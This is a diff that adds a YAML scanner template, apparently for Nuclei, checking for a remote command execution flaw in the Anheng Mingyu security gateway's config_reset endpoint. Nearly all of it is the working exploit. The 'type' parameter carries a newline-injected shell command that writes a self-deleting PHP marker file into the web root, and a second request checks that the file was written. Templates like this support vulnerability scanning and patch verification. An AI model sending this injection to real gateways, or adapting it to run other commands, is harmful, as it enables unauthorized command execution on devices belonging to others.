@@ -1,0 +1,39 @@
+id: anheng-das-gateway-aaa_portal_auth_config_reset-rce
+info:
+  name: 安恒明御安全网关-config_reset-RCE
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E7%BD%91%E5%85%B3-config_reset-RCE.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    hunter-query: demo
+    tips: 未复现
+    repair:
+    version:
+  tags: anheng,mingyu,rce,iot
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        GET /webui/?g=aaa_portal_auth_config_reset&type=%0Aecho%20'%3C?php%20print(%22lifeld%22);unlink(__FILE__);?%3E'%20%3E%3E%20/usr/local/webui/lifeld.php HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |+
+        GET /lifeld.php HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'lifeld')
+        condition: and
